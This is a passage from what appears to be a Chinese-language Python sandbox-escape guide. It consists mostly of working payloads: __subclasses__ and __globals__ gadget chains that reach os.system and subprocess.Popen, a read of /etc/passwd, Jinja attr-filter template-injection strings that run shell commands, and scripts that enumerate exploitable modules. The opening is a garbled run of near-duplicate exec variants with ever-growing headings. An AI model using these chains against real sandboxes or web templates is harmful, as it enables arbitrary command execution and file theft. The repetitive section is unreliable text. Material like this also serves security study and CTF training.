exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': None}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, and `__builtins__.__import__.__globals__.__builtins__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': None}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` and `__builtins__.__import__.__globals__.__builtins__.__import__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, `__builtins__.__import__.__globals__.__builtins__`, and `__builtins__.__import__.__globals__.__builtins__.__import__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': {'__import__': None}}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` and `__builtins__.__import__.__globals__.__builtins__.__import__` and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, `__builtins__.__import__.__globals__.__builtins__`, `__builtins__.__import__.__globals__.__builtins__.__import__`, and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': {'__import__': {'__globals__': None}}}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` and `__builtins__.__import__.__globals__.__builtins__.__import__` and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__.__builtins__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, `__builtins__.__import__.__globals__.__builtins__`, `__builtins__.__import__.__globals__.__builtins__.__import__`, `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__`, and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__.__builtins__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': {'__import__': {'__globals__': {'__builtins__': None}}}}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## 全局变量和局部变量

检查 **`globals`** 和 **`locals`** 是了解你可以访问的内容的好方法。
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals)可以找到数百个**位置**，你可以在这些位置找到**全局变量**。

## 发现任意执行

在这里，我想解释一下如何轻松发现**加载了更危险功能**并提出更可靠的利用方法。

#### 通过绕过访问子类

这个技术最敏感的部分之一是能够**访问基类的子类**。在之前的例子中，使用了`''.__class__.__base__.__subclasses__()`，但还有**其他可能的方法**：
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### 查找已加载的危险库

例如，知道使用库**`sys`**可以**导入任意库**，您可以搜索所有已加载的**模块中是否导入了sys**：
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
有很多方法，我们只需要一个来执行命令：
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
我们可以使用**其他已知可用于执行命令的库**来执行相同的操作：
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
此外，我们甚至可以搜索加载恶意库的模块：
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
此外，如果您认为**其他库**可能能够**调用函数来执行命令**，我们还可以通过**函数名称**在可能的库中进行过滤：
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## 递归搜索内置函数、全局变量...

{% hint style="warning" %}
这真是太棒了。如果你正在寻找像globals、builtins、open或其他任何对象，只需使用这个脚本递归地查找可以找到该对象的位置。
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
